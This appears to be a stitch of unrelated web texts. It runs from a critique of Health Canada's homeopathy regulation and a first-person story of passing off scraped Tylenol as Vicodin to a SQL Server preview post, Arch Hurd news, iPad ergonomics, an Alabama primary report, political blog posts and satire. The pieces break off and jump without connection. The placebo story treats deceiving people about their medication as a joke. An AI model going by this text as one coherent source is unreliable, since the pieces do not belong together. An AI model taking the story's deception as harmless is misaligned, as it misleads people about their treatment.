Materia Medica : Homeopathic manufacturers can use materia medica , which are essentially compilations of information derived from provings .
Again , there is no objective evaluation of efficacy in materia medica .
Health Canada offers a list of 59 references it will accept , but indicates that the list is “ not intended to be all inclusive . ”
Here ’s a few references deemed acceptable , in bold , along with other notable dates to illustrate the parallel process in medical and other sciences .
1834 - Publication of homeopathic reference : Traité de matière médicale ou de l’action pure des médicaments homéopathiques .
1846 – Publication of homeopathic reference : Doctrine et traitement des maladies chroniques
1854 – Publication of homeopathic reference : Codex des médicaments homéopathiques .
1870 – Germ theory of disease proposed by Louis Pasteur and Robert Koch
1864 – Pasteurization introduced
1874 – Incandescent light bulb invented
1882 – Organism that causes tuberculosis identified
1890 – Publication of homeopathic reference : The Guiding Symptoms of our Materia Medica . ( 10 vol . )
1895 – Discovery of X - Rays
1897 – Aspirin invented
1899 – Publication of homeopathic reference : Formulaire de thérapeutique positive ( Homoepathie ) .
1907 – Vitamin C is isolated and identified
1913 – Commercial availability of first vaccine , for diphtheria
1935 – Description of first antibiotic , Prontosil , published
1953 – Double - helix structure of DNA proposed by Watson and Crick
… and so on
Information from provings or materia medica may be used to support the requested conditions of use , including claim , dose , route of administration , etc .
Allowing anecdotes from the 1830 ’s as evidence of efficacy may be seen to be a generous standard .
But to some , the current standards for homeopathic evidence are too stringent .
In a 2008 consultation on the regulations Health Canada noted ,
For the most part stakeholders agreed that Health Canada ’s current definition of homeopathic medicines ( HMs ) is too restrictive and that pharmacopeias may not be up to date with today ’s more advanced or newly developed homeopathic remedies .
It could be because older pharmacopeias likely do n’t include entries on the latest homeopathic remedies , like “ Mobile Phone 900mHz ” , “ Vacuum Cleaner Dust ” , “ MRI Scan ” , or “ Swimming Pool Water ” .
What are the Consequences of a Lowered Bar for Efficacy ?
It ’s clear that the NHP regulations create a efficacy standard that is significantly weaker than the standard established for medicine .
But homeopathic product stands out as particularly problematic from a licensing perspective .
Consider the following :
Quality Assessment : With drug products and herbal products , final product testing can validate the active ingredient and amount of medicinal product per unit .
This is impossible with homeopathic remedies .
There is no way for Health Canada , or anyone else to distinguish between typical remedies .
What this means is there is no way for anyone to tell if a homeopathic product is “ mislabelled ” .
There is actually no way to test if a product has been prepared “ properly ” or not – a manufacturer could simply package bulk lactose tablets in vials , and claim it is any homeopathic remedy .
Not surprisingly , Health Canada does not require final product quality tests that verify the original substance .
Expiry Date : Drug products are subject to stability testing to verify the ongoing stability and safety over time .
Quantitative analysis is done to understand how quickly a product will deteriorate , and the expiry date is established based on this information .
Health Canada says that for homeopathic products , the expiry date is :
the date , expressed at minimum as a year and month , up to and including which a NHP maintains its purity and physical characteristics and its medicinal ingredients maintain their quantity per dosage unit and their potency .
Given there are no medicinal ingredients in most remedies , and the potency cannot be independently verified , it ’s not clear how the homeopathic expiry date is established .
Furthermore , given the concept that less - is - stronger , it ’s not clear why remedies do n’t get stronger and stronger over time .
Product Labelling and Marketing :
When the Canadian Government began the consultation process for regulating natural health products , an entire chapter of the final report was dedicated to informed choice :
To ensure successful decision - making , we feel that people must have both knowledge and authority .
The committee continued :
From the Committee ’s perspective , there is a dual role for the regulator ; first , in ensuring that full and accurate information is readily available and second , in facilitating consumers ’ ability to make reasonable decisions about product use .
These objectives can be achieved in two ways : through research and through information dissemination .
In order for consumers to make good decisions , they need to be fully informed about what they ’re purchasing .
In the interest of full disclosure , labels should ideally identify to consumers that homeopathic products contain little to no active ingredients , and that homeopathy has not been demonstrated to be effective , beyond a placebo , for any effect .
Case Study
Let ’s look at one particular product that ’s been approved in Canada , as well as countries around the world : Oscilliococcinum .
This product is prepared by decapitating a duck , taking 35 grams of its liver and 15 grams of its heart and fermenting it for 40 days .
The product then undergoes serial dilutions ( 1 part in 100 ) 200 times in a row , ( i.e. , 200C ) and then dried on lactose / sucrose tablets .
It ’s been noted that in order to obtain even a single molecule of the original fermented duck , a volume of tablets greater that the mass of the entire universe would need to be consumed .
Therefore it is mathematically impossible that there is any of the original product in final product sold .
Consulting Health Canada ’s NHP database ( Search item 80014156 here )
Health Canada has approved the product , with the labelled medicinal ingredient as “ Extract of the liver and heart of Annas barbariae : 200C ” and the following recommended use ( translated from French ) :
Homeopathic medicine to relieve flu symptoms : fever , chills , body aches , headaches .
Not surprisingly , there ’s no convincing evidence that Oscilliococcinum is anything more than a placebo – and how could it be ?
The final product is simple lactose and sucrose .
Regulation in Other Countries
The regulation of homeopathic products was recently scrutinized in the United Kingdom , by the parliamentary science and technology committee .
The Medicines and Healthcare products Regulatory Agency ( MHRA ) , ( their version of Health Canada ) , was criticized for allowing label claims for the remedy Arnica montana 30C :
…we fail to see why the label test design should be acceptable to the MHRA given that , first , it considers that homeopathic products have no effect beyond placebo and , second , Arnica Montana 30 C contains no active ingredient and there is no scientific evidence that it has been demonstrated to be efficacious .
The committee gave specific guidance to the MHRA :
If the MHRA is to continue to regulate the labelling of homeopathic products , which we do not support , we recommend that the tests are redesigned to ensure and demonstrate through user testing that participants clearly understand that the products contain no active ingredients and are unsupported by evidence of efficacy , and the labelling should not mention symptoms , unless the same standard of evidence of efficacy used to assess conventional medicines has been met .
Trickle - down Effects
Health Canada ’s decision to regulate and allow unproven claims for homeopathic products has had broader consequences .
Health Canada ’s approval of any product , pharmaceutical , homeopathic or otherwise , is seen as an important and credible quality indicator .
Earlier this year , the National Association of Pharmacy Regulatory Authorities ( NAPRA ) advised pharmacists that only NHPs approved by Health Canada should be sold in pharmacies :
When presented with a product that does not bear a number issued by Health Canada , it leaves the pharmacist and their patient with no confirmation that the product was properly assessed for its safety , efficacy and quality nor granted approval for sale .
( emphasis added )
This guidance infers that a homeopathic remedy that has been approved with a DIN - HM is both safe and effective , and pharmacies can accept Health Canada ’s evaluation as that evidence .
Value - For -Money ?
The Fraser Institute estimates that the NHPD has cost over $ 9 million per year since it was created in 1999 .
A sizeable proportion of its efforts have been devoted to homeopathy including guidance documents , defining evidence standards , homeopathic “ research priority setting consultation “ , licensing homeopathic products , and even putting a homeopath on its Expert Advisory Committee .
While certain elements of the NHP regulations are probably worthwhile ( particularly the regulation of herbal products ) , the inclusion of homeopathy is puzzling .
Given its pre-scientific methodology , final products without medicinal ingredients , and demonstrable lack of efficacy , the value - for - money of regulation is questionable .
Conclusion
Health Canada has implemented a regulatory system for homeopathy that seeks to adapt a system of sympathetic magic into a structured , scientific process .
To do so , it has essentially eliminated the requirement that homeopathy be supported by credible evidence .
This regulation has led to a licensing framework that is fundamentally unfair to consumers , as it does not disclose that most homeopathic products do n’t contain a single molecule of the product that is named on the label .
Further , it allows centuries - old anecdotal evidence as justification for “ recommended uses ” .
Finally , it reinforces homeopathy ’s legitimacy by assigning distinct numbers ( actually calling them homeopathic “ medicine ” numbers ) to indistinguishable sugar pills .
Health Canada ’s current framework for regulating homeopathic products wastes resources and compromises the regulator ’s credibility .
Why bother regulating homeopathy ?
There is no more of a need to regulate homeopathy than there is to regulate the tools of psychics , ghost hunters , wizards or astrologists .
An evidence - based , science - based approach would mean Health Canada would forbid all treatment statements ( “ recommended uses ” ) with homeopathic remedies , as none have been substantiated .
An appropriate regulatory framework would consider the following :
If a remedy is not sufficiently dilute , it can have medicinal effects .
These products should therefore be treated as drugs , and subject to the same regulatory standards , where persuasive , objective , clinical trial evidence must be produced before specific “ recommended uses ” are allowed .
Approved products would then be assigned drug identification numbers .
If homeopathy is sufficiently dilute , it contains no active ingredients and is not a health - related product .
For these products , Health Canada adds no value by regulating homeopathy , and , in fact , unnecessarily legitimize the products in the process .
Regulations and safety standards are already in place for selling table sugar and drinking water – and these are adequate to protect Canadian consumers who elect to use homeopathy .
By almost every conceivable measure , Americans are less positive and more critical of their government these days .
There is a perfect storm of conditions associated with distrust of government — a dismal economy , an unhappy public , and epic discontent with Congress and elected officials .
These are among the principal findings from a new series of Pew Research Center surveys .
Rather than an activist government to deal with the nation 's top problems , these surveys show that the general public now wants government reformed and ...
Its 8:00 PM and I am sitting in my car in an empty parking lot , covered in white powder , razor blade in my hand , and a little plastic baggie filled with non-descript pills in my lap .
Despite the appearance , if a cop were to search my car , or even investigate everything fully , they would find everything on the up and up .
To understand why , you need to understand the “ Placebo Effect ” .
For the uninitiated , the “ Placebo Effect ” is when the mind and body are tricked into repairing themselves when they believe they are actually getting effective treatment , when they are not .
So powerful is this effect , that pharmaceutical manufacturers must test each drug against a placebo to make sure that their drug is indeed more effective than , say , an Altoid .
This is not a story of how placebos work , however , but how I became a big time placebo dealer .
Five months ago , my girlfriend came down with a bad case of spinal meningitis .
For those of you unfamiliar with this condition , it is basically an infection of the spinal fluid .
There are two forms of spinal meningitis : Bacterial and Viral .
The bacterial variety is particularly nasty , while the viral version frequently goes away by itself .
As it is important for doctors to know which of these two they are dealing with , they often perform what is called a spinal tap , which involves sticking a needle into your spine and drawing out fluid .
This was not fun to watch , and probably far worse to have done .
What they do n’t warn you about prior to the spinal tap is that , unlike blood , spinal fluid does not clot and does not scab .
Basically , what this means is once you poke a hole in your spinal column , it is really hard to stop it from leaking .
What they also do n’t warn you is that this fluid is the same fluid that surrounds your brain and stops it from rattling against your skull when you are nodding your head that you would like that second dose of morphine when you see the needle for the first time .
When this hole that the doctors left in your back leaks enough spinal fluid , and there is n’t enough pressure left to stop your brain from rattling around , you start getting headaches .
Pretty serious headaches .
Not the “ oh my god , I will never drink that much again ” variety , but the “ seeing stars , wishing you were dead kind of migraine ” headaches .
It is at this time that the doctor does what he should have done in the first place and injects some of your own blood over the hole to create a scab that seals it up finally .
After that , it is just a waiting game to see how quickly your body can reproduce those fluids .
For my girlfriend , this meant some pretty major doses of Vicodin in order to make it through the day .
The doctor presecribed about two days worth of the fun little pills .
When these were gone , she called the doctor for a refill , which he happily did .
Another day and a half worth .
Two days later , she was calling him again .
This time , he gave her another day , but it was clearly more reluctantly than the first time .
It was clear to me that the doctor was concerned that he may have a Vicodin addict on his hands , which , in my opinion was pretty ridiculous as we were now getting the pills one day at a time , and he had first hand knowledge why they were needed .
She decided to try and wait it out , but at around 10 o’clock at night , she could n’t take it any more .
I knew that if we called an on - call doctor at 10 o’clock at night , this would certainly raise a red flag .
This was one of those turning point moments for me .
A moment I reflect on every day these days .
I decided to visit a Walgreens and see if I could get some over the counter pain relievers that would pass for Vicodin , that I would put in the bottle and see if this worked I picked up a small bottle of “ Extra Strength Tylenol ” scrapped the little logo printed on the “ caplets ” and place them in the old bottle .
She was in too much pain to be very observant about what was written on the bottle , after all .
Or so I thought .
About a day later , she came to me and asked why the bottle did not have a new date on it .
It is at times like these that I wish I were a better liar .
I told her that I got them from a friend of mine who had some to spare , and put them in the bottle .
Surprisingly enough , this actually worked .
I am pretty sure that if I had tried to pass this off when she was well , it would have gone over like the led balloon it was .
She accepted them as being the Vicodin that they were supposed to be , though .
A few days later , when she asked if I could get some more from my “ source ” , I fugured “ no harm , no foul ” .
The only problem was , doing this two day supply thing was getting really old .
So , my next step down this dark path was to buy a bottle of about sixty , scrape the logos off , one by one , and give them to her .
This spread out the pain of the pill assembly to about once every couple of weeks .
That was , until she asked me for more after only a couple of days .
The reason , she explained , is that a friend of hers had a bad back , and no insurance , so she gave her dose to her friend , who was much better now .
Wow .
Now I was supplying two people with regular Tylenol , and both were responding like it was the “ by prescription only ” drug it was supposed to be .
Given this new wrinkle , I decided to go in whole hog and I shelled out for the 225 pill bottle of Extra Strength Tylenol .
I sat industriously in my car , scraping the logos off one at a time so that any evidence of its origin were erased .
I even shelled out for the special “ snack size ” zip lock baggies to add to the entire “ drug dealer ” appearance .
When I left my car , my clothes were covered in Tylenol powder .
So , understanding that my “ network ” had doubled in size , I really did n’t pay too much attention as my orders started comming in more rapidly as the weeks went on .
Each “ order ” came in a few days earlier than the previous .
I finally noticed when , after “ delivering ” an order of around 200 pills , she was back asking for more .
I was asking mainly out of concern , because 100 Tylenol in one week can cause liver damage .
Not to worry , though .
She was n’t taking too many .
In fact , she claimed that if she took more than three in one day , she would start to get “ loopy ” .
This was good news and bad news .
Good news in the respect that she was n’t abusing the meds , but bad news that if she ever saw through my little ruse , I was certainly going to get killed .
Nobody wants to realize that , no , it was n’t the three Tylenol you had today that got you “ loopy ” .
That was just your normal personality shining through your normal excuses for inhabitions .
The reason she had gone through so many was that I was now not only was I supplying her , and her friend , but her friends boyfriend , her boss , and somebody else at work .
Five people .
That I know of .
At a party last week , I had a friend of a friend pull me aside .
He said that he was looking for Vicodin , and that he did n’t have any money , but that he would be interested in trade for pot , which he had a regular supply of .
I asked him why he was asking me , and he told me that he had gotten some of the pills that I had supplied from someone else , and that he needed more .
By this time , I have been gradually improving my lying skills , so I told him that I was worried that my supplier was starting to get worried that the amount of “ Vicodin ” I was starting to move might start to raise suspicions , so I did n’t want to push it by asking for more than I was already getting .
So , here I am .
In a car .
Covered in white powder from scraping off the little logos on Extra Strength Tylenol pills .
I have to vacuum and wipe down my car out regularly , or the power will start to accumulate like so much snow in the dead of winter .
I have to retreat to empty parking lots , lest I am discovered by somebody I know .
I live in fear of being caught , just like a real drug dealer , only I wont fact prison time .
Just the wrath of about eight people that constitute my whole social life .
I am not doing anything illegal , I think .
At least , I know that nobody that I will be upsetting by doing this will press charges against me .
I am not a real drug dealer .
I just play one on TV .

“ There is a myth that we are all living healthier lives for longer and very little evidence that there are sufficient jobs around for everyone to keep working .
This policy is n’t about choice , it ’s about cutting costs and making the poorest pay the highest price .
The brain is capable of holding and retrieving memories for specific fears , revealing a more sophisticated storage and recall capacity than previously thought , neuroscientists have found .
The study , which appears in the journal Nature Neuroscience , may have implications for treating post - traumatic stress syndrome — as scientists begin to understand how different fears are stored in the brain , they can move toward addressing specific fear memories .
The research was conducted by researchers at New York University ’s Center for Neural Science , the Department of Psychiatry at NYU School of Medicine–Bellevue Hospital Center , the Copernicus Center for Interdisciplinary Studies in Krakow , Poland , Université Paris - Sud , and the Emotional Brain Institute at the Nathan S. Kline Institute for Psychiatric Research .
The research focused on the brain ’s amygdala , which has previously been shown to store fear memories .
However , prior studies have indicated that the amygdala does not discriminate among the different threats it holds and processes .
In other words , whether you are afraid of dogs because you were once bitten by a dog or you are afraid of pizza because you once nearly choked to death eating it , all the amygdala remembers is that both of these experiences were scary .
By contrast , other brain areas , such as cortex , ensures that all other aspects of these fearful events in your life are remembered .
The scientists on the Nature Neuroscience study sought to determine if there were differences in how the amygdala processes and remembers fears .
To do so , they focused on a process called memory consolidation in which an experience is captured , or encoded , then stored .
Once consolidation occurs , memories may be long lasting — one experience may create memories that last a lifetime .
However , whenever recalled , memories become labile — that is , susceptible to changes .
This process is called reconsolidation .
In life , reconsolidation allows updating existing memories .
But this process also serves as a valuable methodological tool as it lets researchers control the modification of memories .
When it comes to developing fear memories , one model posits that during a fear experience , a neutral stimulus ( e.g. , a musical passage ) becomes associated with a negative encounter ( e.g. , a dog bite ) .
Therefore , future occurrences of this neutral stimulus , or conditioned stimulus ( CS ) , forewarns the onset of the negative encounter , or unconditioned stimulus ( US ) .
Previous research shows that the association between a CS and a US is processed and stored in the amygdala .
To replicate this process , the researchers devised an experiment using laboratory rats .
In it , they paired two distinct audio tones , which served as the neutral stimulus , or conditioned stimulus ( CS ) , with mild electric shocks to different parts of the rats ’ bodies .
As a result , the rats linked a mild shock to a certain part of their bodies with a certain tone .
Under the memory reconsolidation model , exposing an organism to any aspect of the learned experience brings this memory back to mind and makes it susceptible to changes .
Thus , if two distinct tones were each paired with two distinct electric shocks and if the amygdala does not discriminate among different threats , then re-exposing a rat to any of these shocks should cause lability of all fear memories stored in the amygdala .
However , the Nature Neuroscience study yielded quite different results .
The researchers found that re-exposing a rat to a particular shock ( that is , one applied to a certain part of the body ) , followed by an injection of an antibiotic known to disrupt reconsolidation processes , impaired only these associations that were linked to this particular shock .
Despite the disruption of one type of fear memory , rats were still able to express fear behavior to the tone which had been paired with a shock applied to another part of the body .
The finding demonstrates that the amygdala makes distinctions among the fear memories it holds and retrieves .
MS SQL Server 2012 Denali , Next Version of SQL Server
Microsoft release Microsoft SQL Server 2012 CTP1 - Community Technology Preview for community free download at Microsoft Downloads .
Database professionals can find more information about SQL Server 2012 release date of this first CTP and download setup files from Microsoft Downloads portal .
SQL Server admins and t-sql developers can refer to How to Install SQL Server 2012 - Microsoft SQL Server 2012 Installation Guide for a sample Microsoft SQL Server 2012 Enterprise Evaluation Edition setup on Windows 7 Ultimate operating system .
For installation prerequisites for MS SQL Server 2012 please refer to Microsoft SQL Server 2012 Requirements .
After you download Microsoft SQL Server Denali CTP version , I strongly suggest database administrators and developers to download SQL Server 2012 sample databases too .
Microsoft has long ago started on project named Denali , codename of MS SQL Server 20112 .
Microsoft has long ago started working on the next version of MS SQL Server , the data platform before releasing the MS SQL Server 2008 R2 version .
Many IT professionals were expecting the SQL Server 2008 R2 to be announced as the MS SQL Server 2010 .
And many search the torrents for SQL Server 2010 download .
But just as other Microsoft products like Windows Server 2008 , the new product releases were named as R2 waves .
After a 5 years period between SQL Server 2000 , the SQL Server 2005 was announced .
Only a three years later the mature data platform product of Microsoft , SQL Server 2008 was introduced to database professionals .
Especially its enhancements in data ETL performances , data mining features the SQL2008 is considered as one of the best products that Microsoft has produced for customers .
Following this success the SQL2008 R2 and Windows 7 were also glady accepted by Microsoft customers .
And now the Microsoft is preparing a new version the successor of SQL Server 2008 with a codename Denali .
The next version of SQL Server is expecting to be ready for launch at the beginning of third quarter in 2012 .
If project goes as planned the successor the new SQL Server 2012 version will be available for use in the middle of year 2012 .
So speculations about the name as Microsoft SQL Server 2010 or SQL Server 2012 will be meaningless .
Here is a screenshot from Microsoft SQL Server 2012 aka SQL Server Denali CTP 1
You can see that when we select @@VERSION build - in parameter on a SQL Denali , we can see the SQL Server engine build numbers as follows :
Microsoft SQL Server " Denali " ( CTP1 ) - 11.0.1103.9 ( Intel X86 )
Sep 24 2010 22:02:43
Copyright ( c ) Microsoft Corporation
Enterprise Evaluation Edition on Windows NT 6.1 < X64 > ( Build 7600 : ) ( WOW64 ) If you are following the naming of Microsoft for beta products , you will remember that SQL Server 2008 R2 was first named as Kilimanjaro .
The codename of MS SQL Server 2012 is Denali which means " the great one " is the name of a mountain in Alaska .
After Yukon , the codename of SQL Server 2005 , which is also a region name in Alaska , an other codename whose origin is Alaska is being used .
Denali is the highest summit in Alaska , will now give its name to the most exciting SQL Server version , Microsoft SQL Server 2012 .
Today , nothing is officially announced about the content of the next version of SQL Server , MS SQL Server 2012 .
But a combining and improved platform for the Business Intelligence tools is my number one focus point of SQL Server 2012 .
T - SQL enhancements will introduce new tsql statements that will make development on SQL Server easier .
There will be absolutely SQL Server Management Studio improvements ( SSMS enhancements ) .
You know with the launch of Microsoft Visual Studio 2010 in April , the BIDS or Business Intelligence Development Studio and the SQL Server Management Studio which are a part of SQL Server 2012 will reflect the changes in GUI of Visual Studio 2010 on the data platform tools side .
So we will probably improved , bug free , powerful tools for SQL Server developers and for database administrators as well as Business Intelligence professionals .
There are wishlists that are published from community members and we can expect Microsoft to include some of these requests to be in the successor of SQL Server , MS SQL2012 .
Bringing solutions for the wishlists , will definitely make the community to wellcome the new SQL Server version .
This approach will increase the user experience and user friendliness among SQL Server professionals .
I 'll try to pass you the information as soon as I 'm informed about the new features and enhancements in data computing that will be introduced for sql developers , BI developers , Business Intelligence experts , SQL Server database administrators and IT professionals from this corner in Kodyaz .
I hope soon to inform you the first CTP download link of MS SQL Server 2012 .
( 11/10/2010 ) Microsoft release SQL Denali , the first pre-release version Microsoft SQL Server 2012 CTP1 for free download and install of SQL Server community at Microsoft Downloads web portal .

These have been a busy two weeks for the Arch Hurd team , Alexander Preisinger ( giselher ) decided , fuelled by his now amazing package - building powers by using Arch Hurd on real hardware , to begin packaging Xorg 1.8 for Arch Hurd , which made it in to extra today .
We do n't have many graphical programs yet , but we have a window manager ( openbox ) and terminal ( xterm ) - enough to start with .
Secondly , but not less important , is the creation of an Arch Hurd LiveCD by Michael Walker ( barrucadu ) .
Whilst still only an initial prototype version with no setup program , we have Arch Hurd booting from your ( IDE ) CD / DVD drive , and running fine .
There seems to be a problem with amd64 processors , however , so if you try the livecd with an AMD processor , I ( Barrucadu ) would be interested to know what happens .
We would like to take this opportunity to thank people without whom this project could not have happened .
Archlinux developers ; Debian developers ; and of course Hurd developers , you people are the greatest .
The iPad wait ends Saturday as consumers finally get their hands on Apple 's latest creation .
But how comfortable will the iPad actually be to play with and work on ?
Some inauspicious clues come courtesy of the " guided tour " videos posted on the Apple Web site this past Monday .
The short clips suggest how people might go about using an iPad for doing everything from checking email to watching videos to putting together presentations .
Overall , the videos reveal that the iPad may not be as physically kind to a user as one might expect .
" I saw no evidence of being able to put the iPad in a good position to work with , " said Thomas Caffrey , founder of MyoFactors , LLC , a New Jersey - based ergonomics and injury management company .
Caffrey pointed out that users must orient their bodies into strain - inducing positions to both see and touch the iPad 's screen .
Plus , the tablet computer weighs 1.5 – or 1.6 pounds with built - in 3G – which is about five times heavier than an iPhone .
So holding an iPad with one hand while multi-touching with the other could put quite a strain on both the holding and gesturing hands , Caffrey said .
Propping the iPad
In many of the guided tour videos , users modeling how to get comfy with the iPad put their legs up on tables or desks in order to prop their iPad for both viewing and multi - touch access .
In the how - to for watching YouTube videos , for example , a sitting man crosses his left leg over his right at chest height .
This agile act is done to prop up the iPad so a female friend also sitting on the couch can watch the online clip .
Similarly , in the video for Keynote – a presentation program similar to Microsoft 's popular PowerPoint – the user sits in a black leather chair and elevates his feet on a nearby metal table to head - height before placing the iPad against his knees to work .
In both examples , Caffrey said , such leg positioning is " impractical for any extended period " due to physical strain and discomfort .
An iPad user relaxing in his or her bed with their back propped against a pillow will still have problems , said Alan Hedge , director of the Human Factors and Ergonomics Laboratory at Cornell University .
Though the user can make a sloping , iPad - supporting arch by resting his or her legs on piled blankets , " they 're not going to stay in that position for too long because it 's going to get tiring , " Hedge said .
Grip fatigue
In other guided tour videos , one hand holds the iPad at a raised viewing angle while fingers on the other hand navigate the screen via multi-touch .
This fundamental way of interfacing with the iPad will not be kind to the body in the long run , Caffrey thinks .
For starters , the grip strength required to hold the iPad up at a viewing angle is far greater than that for a lighter newspaper or magazine , both of which can fold to increase ease of use .
Also , the finger or fingers used to navigate on the iPad screen must always be in a raised position ( unless one is looking face - down at the iPad , which would then lead to neck strain ) .
This finger " is always up and is therefore opposing gravity , " said Caffrey .
" Anytime you ’re opposing gravity it equals more work . "
Traditional computer mice get around this problem , Caffrey said , because a user 's hand rests on the mouse and when " you 're clicking , [ your finger ] is going with gravity . "
Finally , in order to type on an iPad , one 's wrists must be raised , and " that typing position can never be recommended from an ergonomics best practice , " Caffrey said .
Accessorize the strain away ?
Apple has of course recognized some of these potential issues and has made a charging dock that holds the iPad at a good viewing angle and an external keyboard available as accessories .
Hedge predicts more will follow .
" I think there will be a number of accessories for the iPad that will let you prop it , " he said .
To an extent , however , with some of these accessories one will have essentially " just reinvented the laptop , " Hedge said , and laptops have their own long - standing ergonomic issues .
These include the stressful " airport posture " of sitting hunched over a laptop across one 's lap with rounded shoulders and arms held close to the body .
" It 's not like you can be ergonomic with a laptop but at least you can make it less of a problem , " said Caffrey , by having some variability in the positioning of the keyboard and screen .
Comforting tips
So what can users do to keep their iPad viewing experience pleasurable ?
" The key thing is to put the iPad on something rather than on somebody , " Hedge told TechNewsDaily .
That kind of placement should not prove difficult when watching a movie or doing other hands - free , non-iPad - interfacing activities such as listening to music .
For when the iPad needs to be touched , however , Hedge says varying one 's posture every five to 10 minutes will be worth the extra effort .
and Thomas Spencer --- The Birmingham News
State Agriculture Commissioner Ron Sparks won the Democratic Party nomination for governor Tuesday , a victory some power brokers in his party once thought so unlikely they tried to find another candidate to take his place .
Even Sparks seemed to have doubted his chances of winning , having at one point mulled dropping out of the race and running for Congress .
Sparks now credits those second thoughts to his campaign manager at the time .
But Sparks did n't drop out , and on Tuesday he was rewarded with one of the more remarkable upsets in Alabama primary history .
In unofficial results , Sparks beat U.S. Rep. Artur Davis of Birmingham .
In unofficial results released early Wednesday morning , with 99 percent of precincts reporting , Sparks had 199,190 votes ( 62 percent ) and Davis had 119,908 ( 38 percent ) .
While votes were still being counted and results were not complete , Davis did n't wait for the final tally .
He conceded the race to Sparks shortly before 10 p.m. in front of somber supporters in downtown Birmingham .
" This is not exactly the speech I 'd planned to give tonight , " Davis said .
He congratulated Sparks and noted that both men had been reared by single mothers with the help of a grandmother in challenging circumstances and had risen to the level of running for governor .
" It says something about the American Dream , " Davis said .
Davis urged supporters to rally around the Democratic nominee and give him their support .
He said he still believed in the basic themes of his campaign : the need for constitutional reform and economic improvement .
" A better champion will come along , " he said .
Sparks ' victory denied Davis ' bid to make history by becoming the first black in Alabama to win his party 's nomination for governor .
Sparks , 57 , won the nomination in large part by campaigning on a single issue : his support for legalizing , regulating and taxing Las Vegas - style gambling in Alabama .
Sparks stumped the state , telling would - be voters that taxing gambling proceeds would go a long way toward helping pay for a variety of needs -- from improving schools , better funding medical care for the needy and paying for college scholarships for deserving students .
At his victory party Tuesday night in Montgomery , Sparks initially told supporters he was cautiously optimistic about winning .
Some 45 minutes later Davis conceded .
While hard numbers were not yet available late Tuesday , long time observers in Davis ' camp said Sparks ' victory appears to have been achieved , at least in part , because of low voter turnout among blacks who , unlike two years ago when they showed up in big numbers to vote for Barack Obama , showed no such enthusiasm for Davis on Tuesday .

This is a conservative blog .
It relates to current events , politics and issues in the realm of faith .
Everything in this blog is taken from a Reagan conservative point of view .
If that offends you then either do n't come here or step up and join the debate .
After wiping the drool off our screens long enough to actually read Sprint ’s press release for the EVO 4G , we found ourselves a bit put off by the 10 $ / month ‘ Premium Data Charge ’ .
Here ’s the relevant excerpt from the release :
A $ 10 per month Premium Data add - on will apply allowing customers to take advantage of a richer data experience than ever before .
The way that the $ 10 / month fee is presented in the press release seems to imply that it would only be applicable to those who can take advantage of Sprint ’s 4G network , which is still in the process of rolling out in many parts of the country .
However , after seeking out further clarification , it is apparent this is not the case .
Instead , if you pick up an EVO 4G , whether you can get the 4G data speeds or not , you ’ll be shelling out an additional $ 10 per month .
The official logic for this decision was explained by John Taylor , a Sprint Nextel spokesman , on his blog :
Because the phone has a faster processor , a huge 4.3 inch screen and an 8 megapixel camcorder / camera , we expect you will be using a lot more data than you would with our other devices .
These features will give you capabilities that have previously never been available on a wireless device and we think they provide a premium experience .
( Remember , this is the world 's first 3G / 4G Android phone . )
Here ’s the thing :
So what ?
You know what else has a ‘ faster processor ’ and an 8 megapixel camcorder / camera ( albeit with a slightly smaller screen , but last I checked my screen is n’t using any data on its own ) ?
The Droid Incredible , and last I checked Verizon was n’t about to start charging an extra $ 10 a month because it anticipates its users will be using greater amounts of data .
If this charge were to apply to only those who can use the 4G network , fine , that would be reasonable as you ’re getting something tangible in exchange for a monthly fee .
But instead , you ’re getting stuck with an extra $ 10 a month , regardless of whether or not you ’re using their 4G network , because you might use more data .
This is n’t the perfect analogy , but think about this : what if you purchased a new , faster computer and your ISP decided they ’re going to charge you $ 10 / month extra because they think you ’re going to use additional bandwidth as you take advantage of your computer ’s new features ?
Never mind that the $ 10 / month will not actually net you a tangible change in internet speeds since you ’re not in their super - ultra - mega - fast - broadband service area , but that computer sure is shiny and we know you ’ll be tempted to clog the tubes with your Youtubing , so we ’ll go ahead and charge you anyways .
Now , playing Devil ’s advocate , I do understand that network capacity can be a scarce resource – we ’ve all had friends gripe about awful experiences with AT&T after the iPhone was introduced .
But with that being the case , why not just charge the big offenders ?
Or why not have the extra $ 10 / month be opt - in for those that do plan on really taking advantage of the phone ’s multimedia features ?
As you can probably tell , I ’m none too excited about the new change – however , I ’ll probably end up getting an EVO 4G regardless .
Do you think it ’s fair to have to shell out the extra $ 10 / month if you live an area that is n’t covered by 4G ?
Is this charge going to change your decision to buy the phone ?

Congress gives Felipe Calderon a standing ovation for bashing Arizona ’s immigration law
I am going to be perfectly honest with you , the story that I am about to write about absolutely sickens me !
Today Mexican President Felipe Calderon stood in front of the United States congress and lectured them about Arizona ’s new immigration law .
His comments about Arizona ’s law drew a standing ovation from congress .
He stood up in front of our government officials and slammed a law that one of our states made , and congress stood up and applauded him for this .
I have seen many reports on the internet about Democrats giving him a standing ovation , but I am not willing to let Republicans off of the hook here .
It appears to me that when the standing ovation started there were also Republicans who stood up and cheered him .
It can be argued that the congress was simply doing this as a show of respect to the leader of another country but that does not cut it in my opinion .
I am disgusted by the fact that a foreign leader was on OUR soil , bashed OUR country , and OUR leaders cheered him on loudly for this .
70 % of Americans polled agree with Arizona ’s new law and yet congress decided to alienate those Americans in order to align themselves with the president of another country .
It shows us where their true loyalties lie .
We MUST remember this in November and show congress where OUR loyalties lie– with the United States of AMERICA !
UPDATE : It turns out that it was actually Eric Holder who led the standing ovation , read more here .
Carson at the big firm where he works , nearly six miles from his childhood stomping grounds .
NEW YORK — Despite his humble beginnings in a small three - bedroom apartment on the Upper East Side , local Manhattan boy James Michael Carson has made a success of himself in the big city , sources reported .

Six years ago , Carson left his close - knit neighborhood in the affluent heart of New York City to pursue his dreams of becoming even more affluent in the city 's financial district .
Last week , he finally returned home .
" It makes me proud to see one of our own do so well for himself , " said neighbor Janette Friedman , who remembers when Carson was just a small boy , waiting in the marble foyer of their apartment complex each morning for a livery car to take him all the way up to the Dalton School .
" I always knew he was headed for big things . "

In 2004 , Carson , fresh out of business school and unsure what to do next , chose to leave the safe confines of home and try his luck in investment banking — a world in which he had no connections at all aside from one or two influential family friends .
With nothing in his pocket but the money his parents had put aside years ago specifically to cover all of his expenses , Carson set out to make his own separate personal fortune as a Wall Street trader .

Carson 's humble childhood home : " It feels like a shoe box " compared to the 67th - floor penthouse where he now lives .
" He was the first member of our family ever to go below 14th Street , " said Carson 's sister , the novelist Karen Carson - Skyles .
" We are so proud of what he 's managed to accomplish .
It just goes to show that dreams really do come true . "

